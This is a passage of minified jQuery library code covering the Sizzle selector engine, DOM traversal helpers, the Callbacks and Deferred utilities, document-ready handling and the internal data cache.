d.push(j),d}else if(w&&(j=w.getElementById(f))&&t(b,j)&&j.id===f)return d.push(j),d}else{if(o[2])return H.apply(d,b.getElementsByTagName(a)),d;if((f=o[3])&&c.getElementsByClassName&&b.getElementsByClassName)return H.apply(d,b.getElementsByClassName(f)),d}if(c.qsa&&!A[a+" "]&&(!q||!q.test(a))){if(1!==x)w=b,s=a;else if("object"!==b.nodeName.toLowerCase()){(k=b.getAttribute("id"))?k=k.replace(aa,"\\$&"):b.setAttribute("id",k=u),r=g(a),h=r.length,l=V.test(k)?"#"+k:"[id='"+k+"']";while(h--)r[h]=l+" "+qa(r[h]);s=r.join(","),w=_.test(a)&&oa(b.parentNode)||b}if(s)try{return H.apply(d,w.querySelectorAll(s)),d}catch(y){}finally{k===u&&b.removeAttribute("id")}}}return i(a.replace(Q,"$1"),b,d,e)}function ga(){var a=[];function b(c,e){return a.push(c+" ")>d.cacheLength&&delete b[a.shift()],b[c+" "]=e}return b}function ha(a){return a[u]=!0,a}function ia(a){var b=n.createElement("div");try{return!!a(b)}catch(c){return!1}finally{b.parentNode&&b.parentNode.removeChild(b),b=null}}function ja(a,b){var c=a.split("|"),e=c.length;while(e--)d.attrHandle[c[e]]=b}function ka(a,b){var c=b&&a,d=c&&1===a.nodeType&&1===b.nodeType&&(~b.sourceIndex||C)-(~a.sourceIndex||C);if(d)return d;if(c)while(c=c.nextSibling)if(c===b)return-1;return a?1:-1}function la(a){return function(b){var c=b.nodeName.toLowerCase();return"input"===c&&b.type===a}}function ma(a){return function(b){var c=b.nodeName.toLowerCase();return("input"===c||"button"===c)&&b.type===a}}function na(a){return ha(function(b){return b=+b,ha(function(c,d){var e,f=a([],c.length,b),g=f.length;while(g--)c[e=f[g]]&&(c[e]=!(d[e]=c[e]))})})}function oa(a){return a&&"undefined"!=typeof a.getElementsByTagName&&a}c=fa.support={},f=fa.isXML=function(a){var b=a&&(a.ownerDocument||a).documentElement;return b?"HTML"!==b.nodeName:!1},m=fa.setDocument=function(a){var b,e,g=a?a.ownerDocument||a:v;return g!==n&&9===g.nodeType&&g.documentElement?(n=g,o=n.documentElement,p=!f(n),(e=n.defaultView)&&e.top!==e&&(e.addEventListener?e.addEventListener("unload",da,!1):e.attachEvent&&e.attachEvent("onunload",da)),c.attributes=ia(function(a){return a.className="i",!a.getAttribute("className")}),c.getElementsByTagName=ia(function(a){return a.appendChild(n.createComment("")),!a.getElementsByTagName("*").length}),c.getElementsByClassName=Z.test(n.getElementsByClassName),c.getById=ia(function(a){return o.appendChild(a).id=u,!n.getElementsByName||!n.getElementsByName(u).length}),c.getById?(d.find.ID=function(a,b){if("undefined"!=typeof b.getElementById&&p){var c=b.getElementById(a);return c?[c]:[]}},d.filter.ID=function(a){var b=a.replace(ba,ca);return function(a){return a.getAttribute("id")===b}}):(delete d.find.ID,d.filter.ID=function(a){var b=a.replace(ba,ca);return function(a){var c="undefined"!=typeof a.getAttributeNode&&a.getAttributeNode("id");return c&&c.value===b}}),d.find.TAG=c.getElementsByTagName?function(a,b){return"undefined"!=typeof b.getElementsByTagName?b.getElementsByTagName(a):c.qsa?b.querySelectorAll(a):void 0}:function(a,b){var c,d=[],e=0,f=b.getElementsByTagName(a);if("*"===a){while(c=f[e++])1===c.nodeType&&d.push(c);return d}return f},d.find.CLASS=c.getElementsByClassName&&function(a,b){return"undefined"!=typeof b.getElementsByClassName&&p?b.getElementsByClassName(a):void 0},r=[],q=[],(c.qsa=Z.test(n.querySelectorAll))&&(ia(function(a){o.appendChild(a).innerHTML="<a id='"+u+"'></a><select id='"+u+"-\r\\' msallowcapture=''><option selected=''></option></select>",a.querySelectorAll("[msallowcapture^='']").length&&q.push("[*^$]="+L+"*(?:''|\"\")"),a.querySelectorAll("[selected]").length||q.push("\\["+L+"*(?:value|"+K+")"),a.querySelectorAll("[id~="+u+"-]").length||q.push("~="),a.querySelectorAll(":checked").length||q.push(":checked"),a.querySelectorAll("a#"+u+"+*").length||q.push(".#.+[+~]")}),ia(function(a){var b=n.createElement("input");b.setAttribute("type","hidden"),a.appendChild(b).setAttribute("name","D"),a.querySelectorAll("[name=d]").length&&q.push("name"+L+"*[*^$|!~]?="),a.querySelectorAll(":enabled").length||q.push(":enabled",":disabled"),a.querySelectorAll("*,:x"),q.push(",.*:")})),(c.matchesSelector=Z.test(s=o.matches||o.webkitMatchesSelector||o.mozMatchesSelector||o.oMatchesSelector||o.msMatchesSelector))&&ia(function(a){c.disconnectedMatch=s.call(a,"div"),s.call(a,"[s!='']:x"),r.push("!=",O)}),q=q.length&&new RegExp(q.join("|")),r=r.length&&new RegExp(r.join("|")),b=Z.test(o.compareDocumentPosition),t=b||Z.test(o.contains)?function(a,b){var c=9===a.nodeType?a.documentElement:a,d=b&&b.parentNode;return a===d||!(!d||1!==d.nodeType||!(c.contains?c.contains(d):a.compareDocumentPosition&&16&a.compareDocumentPosition(d)))}:function(a,b){if(b)while(b=b.parentNode)if(b===a)return!0;return!1},B=b?function(a,b){if(a===b)return l=!0,0;var d=!a.compareDocumentPosition-!b.compareDocumentPosition;return d?d:(d=(a.ownerDocument||a)===(b.ownerDocument||b)?a.compareDocumentPosition(b):1,1&d||!c.sortDetached&&b.compareDocumentPosition(a)===d?a===n||a.ownerDocument===v&&t(v,a)?-1:b===n||b.ownerDocument===v&&t(v,b)?1:k?J(k,a)-J(k,b):0:4&d?-1:1)}:function(a,b){if(a===b)return l=!0,0;var c,d=0,e=a.parentNode,f=b.parentNode,g=[a],h=[b];if(!e||!f)return a===n?-1:b===n?1:e?-1:f?1:k?J(k,a)-J(k,b):0;if(e===f)return ka(a,b);c=a;while(c=c.parentNode)g.unshift(c);c=b;while(c=c.parentNode)h.unshift(c);while(g[d]===h[d])d++;return d?ka(g[d],h[d]):g[d]===v?-1:h[d]===v?1:0},n):n},fa.matches=function(a,b){return fa(a,null,null,b)},fa.matchesSelector=function(a,b){if((a.ownerDocument||a)!==n&&m(a),b=b.replace(T,"='$1']"),c.matchesSelector&&p&&!A[b+" "]&&(!r||!r.test(b))&&(!q||!q.test(b)))try{var d=s.call(a,b);if(d||c.disconnectedMatch||a.document&&11!==a.document.nodeType)return d}catch(e){}return fa(b,n,null,[a]).length>0},fa.contains=function(a,b){return(a.ownerDocument||a)!==n&&m(a),t(a,b)},fa.attr=function(a,b){(a.ownerDocument||a)!==n&&m(a);var e=d.attrHandle[b.toLowerCase()],f=e&&D.call(d.attrHandle,b.toLowerCase())?e(a,b,!p):void 0;return void 0!==f?f:c.attributes||!p?a.getAttribute(b):(f=a.getAttributeNode(b))&&f.specified?f.value:null},fa.error=function(a){throw new Error("Syntax error, unrecognized expression: "+a)},fa.uniqueSort=function(a){var b,d=[],e=0,f=0;if(l=!c.detectDuplicates,k=!c.sortStable&&a.slice(0),a.sort(B),l){while(b=a[f++])b===a[f]&&(e=d.push(f));while(e--)a.splice(d[e],1)}return k=null,a},e=fa.getText=function(a){var b,c="",d=0,f=a.nodeType;if(f){if(1===f||9===f||11===f){if("string"==typeof a.textContent)return a.textContent;for(a=a.firstChild;a;a=a.nextSibling)c+=e(a)}else if(3===f||4===f)return a.nodeValue}else while(b=a[d++])c+=e(b);return c},d=fa.selectors={cacheLength:50,createPseudo:ha,match:W,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(a){return a[1]=a[1].replace(ba,ca),a[3]=(a[3]||a[4]||a[5]||"").replace(ba,ca),"~="===a[2]&&(a[3]=" "+a[3]+" "),a.slice(0,4)},CHILD:function(a){return a[1]=a[1].toLowerCase(),"nth"===a[1].slice(0,3)?(a[3]||fa.error(a[0]),a[4]=+(a[4]?a[5]+(a[6]||1):2*("even"===a[3]||"odd"===a[3])),a[5]=+(a[7]+a[8]||"odd"===a[3])):a[3]&&fa.error(a[0]),a},PSEUDO:function(a){var b,c=!a[6]&&a[2];return W.CHILD.test(a[0])?null:(a[3]?a[2]=a[4]||a[5]||"":c&&U.test(c)&&(b=g(c,!0))&&(b=c.indexOf(")",c.length-b)-c.length)&&(a[0]=a[0].slice(0,b),a[2]=c.slice(0,b)),a.slice(0,3))}},filter:{TAG:function(a){var b=a.replace(ba,ca).toLowerCase();return"*"===a?function(){return!0}:function(a){return a.nodeName&&a.nodeName.toLowerCase()===b}},CLASS:function(a){var b=y[a+" "];return b||(b=new RegExp("(^|"+L+")"+a+"("+L+"|$)"))&&y(a,function(a){return b.test("string"==typeof a.className&&a.className||"undefined"!=typeof a.getAttribute&&a.getAttribute("class")||"")})},ATTR:function(a,b,c){return function(d){var e=fa.attr(d,a);return null==e?"!="===b:b?(e+="","="===b?e===c:"!="===b?e!==c:"^="===b?c&&0===e.indexOf(c):"*="===b?c&&e.indexOf(c)>-1:"$="===b?c&&e.slice(-c.length)===c:"~="===b?(" "+e.replace(P," ")+" ").indexOf(c)>-1:"|="===b?e===c||e.slice(0,c.length+1)===c+"-":!1):!0}},CHILD:function(a,b,c,d,e){var f="nth"!==a.slice(0,3),g="last"!==a.slice(-4),h="of-type"===b;return 1===d&&0===e?function(a){return!!a.parentNode}:function(b,c,i){var j,k,l,m,n,o,p=f!==g?"nextSibling":"previousSibling",q=b.parentNode,r=h&&b.nodeName.toLowerCase(),s=!i&&!h,t=!1;if(q){if(f){while(p){m=b;while(m=m[p])if(h?m.nodeName.toLowerCase()===r:1===m.nodeType)return!1;o=p="only"===a&&!o&&"nextSibling"}return!0}if(o=[g?q.firstChild:q.lastChild],g&&s){m=q,l=m[u]||(m[u]={}),k=l[m.uniqueID]||(l[m.uniqueID]={}),j=k[a]||[],n=j[0]===w&&j[1],t=n&&j[2],m=n&&q.childNodes[n];while(m=++n&&m&&m[p]||(t=n=0)||o.pop())if(1===m.nodeType&&++t&&m===b){k[a]=[w,n,t];break}}else if(s&&(m=b,l=m[u]||(m[u]={}),k=l[m.uniqueID]||(l[m.uniqueID]={}),j=k[a]||[],n=j[0]===w&&j[1],t=n),t===!1)while(m=++n&&m&&m[p]||(t=n=0)||o.pop())if((h?m.nodeName.toLowerCase()===r:1===m.nodeType)&&++t&&(s&&(l=m[u]||(m[u]={}),k=l[m.uniqueID]||(l[m.uniqueID]={}),k[a]=[w,t]),m===b))break;return t-=e,t===d||t%d===0&&t/d>=0}}},PSEUDO:function(a,b){var c,e=d.pseudos[a]||d.setFilters[a.toLowerCase()]||fa.error("unsupported pseudo: "+a);return e[u]?e(b):e.length>1?(c=[a,a,"",b],d.setFilters.hasOwnProperty(a.toLowerCase())?ha(function(a,c){var d,f=e(a,b),g=f.length;while(g--)d=J(a,f[g]),a[d]=!(c[d]=f[g])}):function(a){return e(a,0,c)}):e}},pseudos:{not:ha(function(a){var b=[],c=[],d=h(a.replace(Q,"$1"));return d[u]?ha(function(a,b,c,e){var f,g=d(a,null,e,[]),h=a.length;while(h--)(f=g[h])&&(a[h]=!(b[h]=f))}):function(a,e,f){return b[0]=a,d(b,null,f,c),b[0]=null,!c.pop()}}),has:ha(function(a){return function(b){return fa(a,b).length>0}}),contains:ha(function(a){return a=a.replace(ba,ca),function(b){return(b.textContent||b.innerText||e(b)).indexOf(a)>-1}}),lang:ha(function(a){return V.test(a||"")||fa.error("unsupported lang: "+a),a=a.replace(ba,ca).toLowerCase(),function(b){var c;do if(c=p?b.lang:b.getAttribute("xml:lang")||b.getAttribute("lang"))return c=c.toLowerCase(),c===a||0===c.indexOf(a+"-");while((b=b.parentNode)&&1===b.nodeType);return!1}}),target:function(b){var c=a.location&&a.location.hash;return c&&c.slice(1)===b.id},root:function(a){return a===o},focus:function(a){return a===n.activeElement&&(!n.hasFocus||n.hasFocus())&&!!(a.type||a.href||~a.tabIndex)},enabled:function(a){return a.disabled===!1},disabled:function(a){return a.disabled===!0},checked:function(a){var b=a.nodeName.toLowerCase();return"input"===b&&!!a.checked||"option"===b&&!!a.selected},selected:function(a){return a.parentNode&&a.parentNode.selectedIndex,a.selected===!0},empty:function(a){for(a=a.firstChild;a;a=a.nextSibling)if(a.nodeType<6)return!1;return!0},parent:function(a){return!d.pseudos.empty(a)},header:function(a){return Y.test(a.nodeName)},input:function(a){return X.test(a.nodeName)},button:function(a){var b=a.nodeName.toLowerCase();return"input"===b&&"button"===a.type||"button"===b},text:function(a){var b;return"input"===a.nodeName.toLowerCase()&&"text"===a.type&&(null==(b=a.getAttribute("type"))||"text"===b.toLowerCase())},first:na(function(){return[0]}),last:na(function(a,b){return[b-1]}),eq:na(function(a,b,c){return[0>c?c+b:c]}),even:na(function(a,b){for(var c=0;b>c;c+=2)a.push(c);return a}),odd:na(function(a,b){for(var c=1;b>c;c+=2)a.push(c);return a}),lt:na(function(a,b,c){for(var d=0>c?c+b:c;--d>=0;)a.push(d);return a}),gt:na(function(a,b,c){for(var d=0>c?c+b:c;++d<b;)a.push(d);return a})}},d.pseudos.nth=d.pseudos.eq;for(b in{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})d.pseudos[b]=la(b);for(b in{submit:!0,reset:!0})d.pseudos[b]=ma(b);function pa(){}pa.prototype=d.filters=d.pseudos,d.setFilters=new pa,g=fa.tokenize=function(a,b){var c,e,f,g,h,i,j,k=z[a+" "];if(k)return b?0:k.slice(0);h=a,i=[],j=d.preFilter;while(h){c&&!(e=R.exec(h))||(e&&(h=h.slice(e[0].length)||h),i.push(f=[])),c=!1,(e=S.exec(h))&&(c=e.shift(),f.push({value:c,type:e[0].replace(Q," ")}),h=h.slice(c.length));for(g in d.filter)!(e=W[g].exec(h))||j[g]&&!(e=j[g](e))||(c=e.shift(),f.push({value:c,type:g,matches:e}),h=h.slice(c.length));if(!c)break}return b?h.length:h?fa.error(a):z(a,i).slice(0)};function qa(a){for(var b=0,c=a.length,d="";c>b;b++)d+=a[b].value;return d}function ra(a,b,c){var d=b.dir,e=c&&"parentNode"===d,f=x++;return b.first?function(b,c,f){while(b=b[d])if(1===b.nodeType||e)return a(b,c,f)}:function(b,c,g){var h,i,j,k=[w,f];if(g){while(b=b[d])if((1===b.nodeType||e)&&a(b,c,g))return!0}else while(b=b[d])if(1===b.nodeType||e){if(j=b[u]||(b[u]={}),i=j[b.uniqueID]||(j[b.uniqueID]={}),(h=i[d])&&h[0]===w&&h[1]===f)return k[2]=h[2];if(i[d]=k,k[2]=a(b,c,g))return!0}}}function sa(a){return a.length>1?function(b,c,d){var e=a.length;while(e--)if(!a[e](b,c,d))return!1;return!0}:a[0]}function ta(a,b,c){for(var d=0,e=b.length;e>d;d++)fa(a,b[d],c);return c}function ua(a,b,c,d,e){for(var f,g=[],h=0,i=a.length,j=null!=b;i>h;h++)(f=a[h])&&(c&&!c(f,d,e)||(g.push(f),j&&b.push(h)));return g}function va(a,b,c,d,e,f){return d&&!d[u]&&(d=va(d)),e&&!e[u]&&(e=va(e,f)),ha(function(f,g,h,i){var j,k,l,m=[],n=[],o=g.length,p=f||ta(b||"*",h.nodeType?[h]:h,[]),q=!a||!f&&b?p:ua(p,m,a,h,i),r=c?e||(f?a:o||d)?[]:g:q;if(c&&c(q,r,h,i),d){j=ua(r,n),d(j,[],h,i),k=j.length;while(k--)(l=j[k])&&(r[n[k]]=!(q[n[k]]=l))}if(f){if(e||a){if(e){j=[],k=r.length;while(k--)(l=r[k])&&j.push(q[k]=l);e(null,r=[],j,i)}k=r.length;while(k--)(l=r[k])&&(j=e?J(f,l):m[k])>-1&&(f[j]=!(g[j]=l))}}else r=ua(r===g?r.splice(o,r.length):r),e?e(null,g,r,i):H.apply(g,r)})}function wa(a){for(var b,c,e,f=a.length,g=d.relative[a[0].type],h=g||d.relative[" "],i=g?1:0,k=ra(function(a){return a===b},h,!0),l=ra(function(a){return J(b,a)>-1},h,!0),m=[function(a,c,d){var e=!g&&(d||c!==j)||((b=c).nodeType?k(a,c,d):l(a,c,d));return b=null,e}];f>i;i++)if(c=d.relative[a[i].type])m=[ra(sa(m),c)];else{if(c=d.filter[a[i].type].apply(null,a[i].matches),c[u]){for(e=++i;f>e;e++)if(d.relative[a[e].type])break;return va(i>1&&sa(m),i>1&&qa(a.slice(0,i-1).concat({value:" "===a[i-2].type?"*":""})).replace(Q,"$1"),c,e>i&&wa(a.slice(i,e)),f>e&&wa(a=a.slice(e)),f>e&&qa(a))}m.push(c)}return sa(m)}function xa(a,b){var c=b.length>0,e=a.length>0,f=function(f,g,h,i,k){var l,o,q,r=0,s="0",t=f&&[],u=[],v=j,x=f||e&&d.find.TAG("*",k),y=w+=null==v?1:Math.random()||.1,z=x.length;for(k&&(j=g===n||g||k);s!==z&&null!=(l=x[s]);s++){if(e&&l){o=0,g||l.ownerDocument===n||(m(l),h=!p);while(q=a[o++])if(q(l,g||n,h)){i.push(l);break}k&&(w=y)}c&&((l=!q&&l)&&r--,f&&t.push(l))}if(r+=s,c&&s!==r){o=0;while(q=b[o++])q(t,u,g,h);if(f){if(r>0)while(s--)t[s]||u[s]||(u[s]=F.call(i));u=ua(u)}H.apply(i,u),k&&!f&&u.length>0&&r+b.length>1&&fa.uniqueSort(i)}return k&&(w=y,j=v),t};return c?ha(f):f}return h=fa.compile=function(a,b){var c,d=[],e=[],f=A[a+" "];if(!f){b||(b=g(a)),c=b.length;while(c--)f=wa(b[c]),f[u]?d.push(f):e.push(f);f=A(a,xa(e,d)),f.selector=a}return f},i=fa.select=function(a,b,e,f){var i,j,k,l,m,n="function"==typeof a&&a,o=!f&&g(a=n.selector||a);if(e=e||[],1===o.length){if(j=o[0]=o[0].slice(0),j.length>2&&"ID"===(k=j[0]).type&&c.getById&&9===b.nodeType&&p&&d.relative[j[1].type]){if(b=(d.find.ID(k.matches[0].replace(ba,ca),b)||[])[0],!b)return e;n&&(b=b.parentNode),a=a.slice(j.shift().value.length)}i=W.needsContext.test(a)?0:j.length;while(i--){if(k=j[i],d.relative[l=k.type])break;if((m=d.find[l])&&(f=m(k.matches[0].replace(ba,ca),_.test(j[0].type)&&oa(b.parentNode)||b))){if(j.splice(i,1),a=f.length&&qa(j),!a)return H.apply(e,f),e;break}}}return(n||h(a,o))(f,b,!p,e,!b||_.test(a)&&oa(b.parentNode)||b),e},c.sortStable=u.split("").sort(B).join("")===u,c.detectDuplicates=!!l,m(),c.sortDetached=ia(function(a){return 1&a.compareDocumentPosition(n.createElement("div"))}),ia(function(a){return a.innerHTML="<a href='#'></a>","#"===a.firstChild.getAttribute("href")})||ja("type|href|height|width",function(a,b,c){return c?void 0:a.getAttribute(b,"type"===b.toLowerCase()?1:2)}),c.attributes&&ia(function(a){return a.innerHTML="<input/>",a.firstChild.setAttribute("value",""),""===a.firstChild.getAttribute("value")})||ja("value",function(a,b,c){return c||"input"!==a.nodeName.toLowerCase()?void 0:a.defaultValue}),ia(function(a){return null==a.getAttribute("disabled")})||ja(K,function(a,b,c){var d;return c?void 0:a[b]===!0?b.toLowerCase():(d=a.getAttributeNode(b))&&d.specified?d.value:null}),fa}(a);n.find=t,n.expr=t.selectors,n.expr[":"]=n.expr.pseudos,n.uniqueSort=n.unique=t.uniqueSort,n.text=t.getText,n.isXMLDoc=t.isXML,n.contains=t.contains;var u=function(a,b,c){var d=[],e=void 0!==c;while((a=a[b])&&9!==a.nodeType)if(1===a.nodeType){if(e&&n(a).is(c))break;d.push(a)}return d},v=function(a,b){for(var c=[];a;a=a.nextSibling)1===a.nodeType&&a!==b&&c.push(a);return c},w=n.expr.match.needsContext,x=/^<([\w-]+)\s*\/?>(?:<\/\1>|)$/,y=/^.[^:#\[\.,]*$/;function z(a,b,c){if(n.isFunction(b))return n.grep(a,function(a,d){return!!b.call(a,d,a)!==c});if(b.nodeType)return n.grep(a,function(a){return a===b!==c});if("string"==typeof b){if(y.test(b))return n.filter(b,a,c);b=n.filter(b,a)}return n.grep(a,function(a){return h.call(b,a)>-1!==c})}n.filter=function(a,b,c){var d=b[0];return c&&(a=":not("+a+")"),1===b.length&&1===d.nodeType?n.find.matchesSelector(d,a)?[d]:[]:n.find.matches(a,n.grep(b,function(a){return 1===a.nodeType}))},n.fn.extend({find:function(a){var b,c=this.length,d=[],e=this;if("string"!=typeof a)return this.pushStack(n(a).filter(function(){for(b=0;c>b;b++)if(n.contains(e[b],this))return!0}));for(b=0;c>b;b++)n.find(a,e[b],d);return d=this.pushStack(c>1?n.unique(d):d),d.selector=this.selector?this.selector+" "+a:a,d},filter:function(a){return this.pushStack(z(this,a||[],!1))},not:function(a){return this.pushStack(z(this,a||[],!0))},is:function(a){return!!z(this,"string"==typeof a&&w.test(a)?n(a):a||[],!1).length}});var A,B=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/,C=n.fn.init=function(a,b,c){var e,f;if(!a)return this;if(c=c||A,"string"==typeof a){if(e="<"===a[0]&&">"===a[a.length-1]&&a.length>=3?[null,a,null]:B.exec(a),!e||!e[1]&&b)return!b||b.jquery?(b||c).find(a):this.constructor(b).find(a);if(e[1]){if(b=b instanceof n?b[0]:b,n.merge(this,n.parseHTML(e[1],b&&b.nodeType?b.ownerDocument||b:d,!0)),x.test(e[1])&&n.isPlainObject(b))for(e in b)n.isFunction(this[e])?this[e](b[e]):this.attr(e,b[e]);return this}return f=d.getElementById(e[2]),f&&f.parentNode&&(this.length=1,this[0]=f),this.context=d,this.selector=a,this}return a.nodeType?(this.context=this[0]=a,this.length=1,this):n.isFunction(a)?void 0!==c.ready?c.ready(a):a(n):(void 0!==a.selector&&(this.selector=a.selector,this.context=a.context),n.makeArray(a,this))};C.prototype=n.fn,A=n(d);var D=/^(?:parents|prev(?:Until|All))/,E={children:!0,contents:!0,next:!0,prev:!0};n.fn.extend({has:function(a){var b=n(a,this),c=b.length;return this.filter(function(){for(var a=0;c>a;a++)if(n.contains(this,b[a]))return!0})},closest:function(a,b){for(var c,d=0,e=this.length,f=[],g=w.test(a)||"string"!=typeof a?n(a,b||this.context):0;e>d;d++)for(c=this[d];c&&c!==b;c=c.parentNode)if(c.nodeType<11&&(g?g.index(c)>-1:1===c.nodeType&&n.find.matchesSelector(c,a))){f.push(c);break}return this.pushStack(f.length>1?n.uniqueSort(f):f)},index:function(a){return a?"string"==typeof a?h.call(n(a),this[0]):h.call(this,a.jquery?a[0]:a):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(a,b){return this.pushStack(n.uniqueSort(n.merge(this.get(),n(a,b))))},addBack:function(a){return this.add(null==a?this.prevObject:this.prevObject.filter(a))}});function F(a,b){while((a=a[b])&&1!==a.nodeType);return a}n.each({parent:function(a){var b=a.parentNode;return b&&11!==b.nodeType?b:null},parents:function(a){return u(a,"parentNode")},parentsUntil:function(a,b,c){return u(a,"parentNode",c)},next:function(a){return F(a,"nextSibling")},prev:function(a){return F(a,"previousSibling")},nextAll:function(a){return u(a,"nextSibling")},prevAll:function(a){return u(a,"previousSibling")},nextUntil:function(a,b,c){return u(a,"nextSibling",c)},prevUntil:function(a,b,c){return u(a,"previousSibling",c)},siblings:function(a){return v((a.parentNode||{}).firstChild,a)},children:function(a){return v(a.firstChild)},contents:function(a){return a.contentDocument||n.merge([],a.childNodes)}},function(a,b){n.fn[a]=function(c,d){var e=n.map(this,b,c);return"Until"!==a.slice(-5)&&(d=c),d&&"string"==typeof d&&(e=n.filter(d,e)),this.length>1&&(E[a]||n.uniqueSort(e),D.test(a)&&e.reverse()),this.pushStack(e)}});var G=/\S+/g;function H(a){var b={};return n.each(a.match(G)||[],function(a,c){b[c]=!0}),b}n.Callbacks=function(a){a="string"==typeof a?H(a):n.extend({},a);var b,c,d,e,f=[],g=[],h=-1,i=function(){for(e=a.once,d=b=!0;g.length;h=-1){c=g.shift();while(++h<f.length)f[h].apply(c[0],c[1])===!1&&a.stopOnFalse&&(h=f.length,c=!1)}a.memory||(c=!1),b=!1,e&&(f=c?[]:"")},j={add:function(){return f&&(c&&!b&&(h=f.length-1,g.push(c)),function d(b){n.each(b,function(b,c){n.isFunction(c)?a.unique&&j.has(c)||f.push(c):c&&c.length&&"string"!==n.type(c)&&d(c)})}(arguments),c&&!b&&i()),this},remove:function(){return n.each(arguments,function(a,b){var c;while((c=n.inArray(b,f,c))>-1)f.splice(c,1),h>=c&&h--}),this},has:function(a){return a?n.inArray(a,f)>-1:f.length>0},empty:function(){return f&&(f=[]),this},disable:function(){return e=g=[],f=c="",this},disabled:function(){return!f},lock:function(){return e=g=[],c||(f=c=""),this},locked:function(){return!!e},fireWith:function(a,c){return e||(c=c||[],c=[a,c.slice?c.slice():c],g.push(c),b||i()),this},fire:function(){return j.fireWith(this,arguments),this},fired:function(){return!!d}};return j},n.extend({Deferred:function(a){var b=[["resolve","done",n.Callbacks("once memory"),"resolved"],["reject","fail",n.Callbacks("once memory"),"rejected"],["notify","progress",n.Callbacks("memory")]],c="pending",d={state:function(){return c},always:function(){return e.done(arguments).fail(arguments),this},then:function(){var a=arguments;return n.Deferred(function(c){n.each(b,function(b,f){var g=n.isFunction(a[b])&&a[b];e[f[1]](function(){var a=g&&g.apply(this,arguments);a&&n.isFunction(a.promise)?a.promise().progress(c.notify).done(c.resolve).fail(c.reject):c[f[0]+"With"](this===d?c.promise():this,g?[a]:arguments)})}),a=null}).promise()},promise:function(a){return null!=a?n.extend(a,d):d}},e={};return d.pipe=d.then,n.each(b,function(a,f){var g=f[2],h=f[3];d[f[1]]=g.add,h&&g.add(function(){c=h},b[1^a][2].disable,b[2][2].lock),e[f[0]]=function(){return e[f[0]+"With"](this===e?d:this,arguments),this},e[f[0]+"With"]=g.fireWith}),d.promise(e),a&&a.call(e,e),e},when:function(a){var b=0,c=e.call(arguments),d=c.length,f=1!==d||a&&n.isFunction(a.promise)?d:0,g=1===f?a:n.Deferred(),h=function(a,b,c){return function(d){b[a]=this,c[a]=arguments.length>1?e.call(arguments):d,c===i?g.notifyWith(b,c):--f||g.resolveWith(b,c)}},i,j,k;if(d>1)for(i=new Array(d),j=new Array(d),k=new Array(d);d>b;b++)c[b]&&n.isFunction(c[b].promise)?c[b].promise().progress(h(b,j,i)).done(h(b,k,c)).fail(g.reject):--f;return f||g.resolveWith(k,c),g.promise()}});var I;n.fn.ready=function(a){return n.ready.promise().done(a),this},n.extend({isReady:!1,readyWait:1,holdReady:function(a){a?n.readyWait++:n.ready(!0)},ready:function(a){(a===!0?--n.readyWait:n.isReady)||(n.isReady=!0,a!==!0&&--n.readyWait>0||(I.resolveWith(d,[n]),n.fn.triggerHandler&&(n(d).triggerHandler("ready"),n(d).off("ready"))))}});function J(){d.removeEventListener("DOMContentLoaded",J),a.removeEventListener("load",J),n.ready()}n.ready.promise=function(b){return I||(I=n.Deferred(),"complete"===d.readyState||"loading"!==d.readyState&&!d.documentElement.doScroll?a.setTimeout(n.ready):(d.addEventListener("DOMContentLoaded",J),a.addEventListener("load",J))),I.promise(b)},n.ready.promise();var K=function(a,b,c,d,e,f,g){var h=0,i=a.length,j=null==c;if("object"===n.type(c)){e=!0;for(h in c)K(a,b,h,c[h],!0,f,g)}else if(void 0!==d&&(e=!0,n.isFunction(d)||(g=!0),j&&(g?(b.call(a,d),b=null):(j=b,b=function(a,b,c){return j.call(n(a),c)})),b))for(;i>h;h++)b(a[h],c,g?d:d.call(a[h],h,b(a[h],c)));return e?a:j?b.call(a):i?b(a[0],c):f},L=function(a){return 1===a.nodeType||9===a.nodeType||!+a.nodeType};function M(){this.expando=n.expando+M.uid++}M.uid=1,M.prototype={register:function(a,b){var c=b||{};return a.nodeType?a[this.expando]=c:Object.defineProperty(a,this.expando,{value:c,writable:!0,configurable:!0}),a[this.expando]},cache:function(a){if(!L(a))return{};var b=a[this.expando];return b||(b={},L(a)&&(a.nodeType?a[this.expando]=b:Object.defineProperty(a,this.expando,{value:b,configurable:!0}))),b},set:function(a,b,c){var d,e=this.cache(a);if("string"==typeof b)e[b]=c;else for(d in b)e[d]=b[d];return e},get:function(a,b){return void 0===b?this.cache(a):a[this.expando]&&a[this.expando][b]},access:function(a,b,c){var d;return void 0===b||b&&"string"==typeof b&&void 0===c?(d=this.get(a,b),void 0!==d?d:this.get(a,n.camelCase(b))):(this.set(a,b,c),void 0!==c?c:b)},remove:function(a,b){var c,d,e,f=a[this.expando];if(void 0!==f){if(void 0===b)this.register(a);else{n.isArray(b)?d=b.concat(b.map(n.camelCase)):(e=n.camelCase(b),b in f?d=[b,e]:(d=e,d=d in f?[d]:d.match(G)||[])),c=d.length;while(c--)delete f[d[c]]}(void 0===b||n.isEmptyObject(f))&&(a.nodeType?a[this.expando]=void 0:delete a[this.expando])}},hasData:function(a){var b=a[this.expando];return void 0!==b&&!n.isEmptyObject(b)}};var N=new M,O=new M,P=/^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,Q=/[A-Z]/g;function R(a,b,c){var d;if(void 0===c&&1===a.nodeType)if(d="data-"+b.replace(Q,"-$&").toLowerCase(),c=a.getAttribute(d),"string"==typeof c){try{c="true"===c?!0:"false"===c?!1:"null"===c?null:+c+""===c?+c:P.test(c)?n.parseJSON(c):c;
